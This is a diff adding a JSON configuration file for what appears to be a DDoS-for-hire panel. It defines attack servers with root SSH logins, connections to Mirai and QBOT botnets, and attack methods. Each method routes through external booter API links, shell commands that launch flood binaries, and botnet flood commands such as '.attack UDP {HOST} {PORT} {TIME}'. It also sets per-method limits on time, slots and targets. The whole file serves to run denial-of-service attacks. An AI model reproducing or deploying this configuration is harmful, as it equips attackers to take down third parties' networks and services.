@@ -1,0 +1,370 @@
+{
+    "server_list": [
+        {
+            "note": "THIS IS STILL IN DEVELOPMENT THIS IS STILL IN DEVELOPMENT THIS IS STILL IN DEVELOPMENT",
+            "enabled": false,
+            "tag": "LAYER 4 #1",
+            "configuration": {
+                "ip": "1.1.1.1",
+                "port": 22,
+                "username": "root",
+                "password": "password"
+            }
+        },
+        {
+            "enabled": false,
+            "tag": "LAYER 7 #1",
+            "configuration": {
+                "ip": "1.1.1.1",
+                "port": 22,
+                "username": "root",
+                "password": "password"
+            }
+        }
+    ],
+    "botnet_list": [
+        {
+            "enabled": true,
+            "tag": "MIRAI",
+            "settings": {
+                "note": "THIS IS STILL IN DEVELOPMENT",
+                "login_word": {
+                   "enabled": true,
+                    "sleep_in_milliseconds_before": 500,
+                    "word": "botnet"
+                },
+                "initial_enter": {
+                    "enabled": true,
+                    "sleep_in_milliseconds_before": 500
+                },
+                "tos_page": {
+                    "enabled": true,
+                    "sleep_in_milliseconds_before": 500,
+                    "command": "y"
+                },
+                "sleep_in_milliseconds": {
+                    "before_username": 1000,
+                    "before_password": 1000,
+                    "before_command": 1000
+                }
+            },
+            "config": {
+                "host": "8.8.8.8",
+                "port": 22,
+                "username": "username",
+                "password": "password"
+            }
+        },
+        {
+            "enabled": true,
+            "tag": "QBOT",
+            "settings": {
+                "note": "THIS IS STILL IN DEVELOPMENT",
+                "login_word": {
+                    "enabled": true,
+                    "sleep_in_milliseconds_before": 500,
+                    "word": "botnet"
+                },
+                "initial_enter": {
+                    "enabled": true,
+                    "sleep_in_milliseconds_before": 500
+                },
+                "tos_page": {
+                    "enabled": true,
+                    "sleep_in_milliseconds_before": 500,
+                    "command": "y"
+                },
+                "sleep_in_milliseconds": {
+                    "before_username": 1000,
+                    "before_password": 1000,
+                    "before_command": 1000
+                }
+            },
+            "config": {
+                "host": "1.1.1.1",
+                "port": 22,
+                "username": "username",
+                "password": "password"
+            }
+        }
+    ],
+    "attacks": [
+        {
+            "method_name": "UDPP",
+            "api_funnel": {
+                "enabled": true,
+                "links": [
+                    {
+                        "link": "your api",
+                        "max_time": 1200,
+                        "enabled": true
+                    },
+                    {
+                        "link": "your api",
+                        "max_time": 1200,
+                        "enabled": true
+                    }
+                ]
+            },
+            "server_funnel": {
+                "enabled": false,
+                "note": "*",
+                "all": {
+                    "enabled": true,
+                    "command": "screen -dmS {HOST} ./HOME {HOST} {PORT} {THREADS} {TIME}"
+                },
+                "select": {
+                    "enabled": false,
+                    "servers": [
+                        {
+                            "tag": "LAYER 4 #1",
+                            "command": "screen -dmS {HOST} ./HOME {HOST} {PORT} 10 {TIME}",
+                            "enabled": true
+                        },
+                        {
+                            "tag": "LAYER 4 #2",
+                            "command": "screen -dmS {HOST} ./HOMEV2 {HOST} {PORT} {THREADS} {TIME}",
+                            "enabled": true
+                        }
+                    ]
+                }
+            },
+            "botnet_funnel": {
+                "enabled": false,
+                "note": "*",
+                "all": {
+                    "enabled": true,
+                    "command": ".attack UDP {HOST} {PORT} {TIME}"
+                },
+                "select": {
+                    "enabled": false,
+                    "botnets": [
+                        {
+                            "tag": "QBOT",
+                            "command": ".udp {HOST} {TIME} -dport={PORT}",
+                            "enabled": true
+                        },
+                        {
+                            "tag": "MIRAI",
+                            "command": "UDPFLOOD {HOST} {PORT} {TIME}",
+                            "enabled": true
+                        }
+                    ]
+                }
+            },
+            "configuration": {
+                "method_slots": {
+                    "note": "",
+                    "max": 8,
+                    "enabled": true
+                },
+                "method_min_time": {
+                    "note": "",
+                    "time": 30,
+                    "enabled": true
+                },
+                "method_max_time": {
+                    "note": "*",
+                    "hard": {
+                        "note": "*",
+                        "time": 86400,
+                        "enabled": false
+                    },
+                    "soft": {
+                        "note": "*",
+                        "time": 120,
+                        "enabled": false
+                    }
+                }
+            },
+            "method_status": {
+                "method_is_enabled": true,
+                "settings": {
+                    "note": "*",
+                    "cnc_access_only": false,
+                    "api_access_only": false
+                },
+                "restrictions": {
+                    "what_targets_to_allow": {
+                        "note": "*",
+                        "ip_address": true,
+                        "url": false,
+                        "domain": false,
+                        "subnet": false,
+                        "comma_separated_ip_addresses": false
+                    },
+                    "method_group": {
+                        "note": "",
+                        "method_group_name": "main_network",
+                        "require_method_group_role": false
+                    },
+                    "port_settings": {
+                        "note": "¨*",
+                        "method_port_range": {
+                            "note": "*",
+                            "min_port": 53,
+                            "max_port": 80,
+                            "enabled": false
+                        },
+                        "method_port_whitelist": {
+                            "note": "*",
+                            "ports": [],
+                            "enabled": false
+                        }
+                    },
+                    "as_number_whitelist": {
+                        "note": "*",
+                        "enabled": false,
+                        "as_number": []
+                    },
+                    "note": "*",
+                    "vip": false,
+                    "private": {
+                        "note": "*",
+                        "enabled": true,
+                        "users": []
+                    }
+                }
+            }
+        },
+
+        {
+            "method_name": "test4",
+            "api_funnel": {
+                "enabled": false,
+                "links": [
+                    {
+                        "link": "https://royal-api-net.com/api/attack?username=dqdqz&key=dqd&host={HOST}&port={PORT}&time={TIME}&method=HTTP",
+                        "max_time": 1200,
+                        "enabled": true
+                    },
+                    {
+                        "link": "https://google.com/api/attack?username=&secret=&host={HOST}&port={PORT}&time={TIME}&method=HOME-NTP",
+                        "max_time": 1200,
+                        "enabled": false
+                    }
+                ]
+            },
+            "server_funnel": {
+                "enabled": false,
+                "note": "*",
+                "all": {
+                    "enabled": true,
+                    "command": "screen -dmS {HOST} ./HOME {HOST} {PORT} {THREADS} {TIME}"
+                },
+                "select": {
+                    "enabled": false,
+                    "servers": [
+                        {
+                            "tag": "LAYER 4 #1",
+                            "command": "screen -dmS {HOST} ./HOME {HOST} {PORT} 10 {TIME}",
+                            "enabled": true
+                        },
+                        {
+                            "tag": "LAYER 4 #2",
+                            "command": "screen -dmS {HOST} ./HOMEV2 {HOST} {PORT} {THREADS} {TIME}",
+                            "enabled": true
+                        }
+                    ]
+                }
+            },
+            "botnet_funnel": {
+                "enabled": false,
+                "note": "*",
+                "all": {
+                    "enabled": true,
+                    "command": ".attack UDP {HOST} {PORT} {TIME}"
+                },
+                "select": {
+                    "enabled": false,
+                    "botnets": [
+                        {
+                            "tag": "QBOT",
+                            "command": ".udp {HOST} {TIME} -dport={PORT}",
+                            "enabled": true
+                        },
+                        {
+                            "tag": "MIRAI",
+                            "command": "UDPFLOOD {HOST} {PORT} {TIME}",
+                            "enabled": true
+                        }
+                    ]
+                }
+            },
+            "configuration": {
+                "method_slots": {
+                    "note": "THIS IS STILL IN DEVELOPMENT",
+                    "max": 1000,
+                    "enabled": false
+                },
+                "method_min_time": {
+                    "note": "THIS IS STILL IN DEVELOPMENT.",
+                    "time": 1,
+                    "enabled": false
+                },
+                "method_max_time": {
+                    "note": "THIS IS STILL IN DEVELOPMENT",
+                    "hard": {
+                        "note": "THIS IS STILL IN DEVELOPMENT",
+                        "time": 86400,
+                        "enabled": false
+                    },
+                    "soft": {
+                        "note": "THIS IS STILL IN DEVELOPMENT",
+                        "time": 120,
+                        "enabled": false
+                    }
+                }
+            },
+            "method_status": {
+                "method_is_enabled": true,
+                "settings": {
+                    "note": "THIS IS STILL IN DEVELOPMENT",
+                    "cnc_access_only": false,
+                    "api_access_only": false
+                },
+                "restrictions": {
+                    "what_targets_to_allow": {
+                        "note": "THIS IS STILL IN DEVELOPMENT",
+                        "ip_address": false,
+                        "url": true,
+                        "domain": false,
+                        "subnet": false,
+                        "comma_separated_ip_addresses": false
+                    },
+                    "method_group": {
+                        "note": "THIS IS STILL IN DEVELOPMENT",
+                        "method_group_name": "main_network",
+                        "require_method_group_role": false
+                    },
+                    "port_settings": {
+                        "note": "THIS IS STILL IN DEVELOPMENT",
+                        "method_port_range": {
+                            "note": "THIS IS STILL IN DEVELOPMENT",
+                            "min_port": 53,
+                            "max_port": 80,
+                            "enabled": false
+                        },
+                        "method_port_whitelist": {
+                            "note": "THIS IS STILL IN DEVELOPMENT",
+                            "ports": [],
+                            "enabled": false
+                        }
+                    },
+                    "as_number_whitelist": {
+                        "note": "THIS IS STILL IN DEVELOPMENT",
+                        "enabled": false,
+                        "as_number": []
+                    },
+                    "note": "THIS IS STILL IN DEVELOPMENT",
+                    "vip": false,
+                    "private": {
+                        "note": "THIS IS STILL IN DEVELOPMENT",
+                        "enabled": false,
+                        "users": []
+                    }
+                }
+            }
+        }
+    ] 
+}
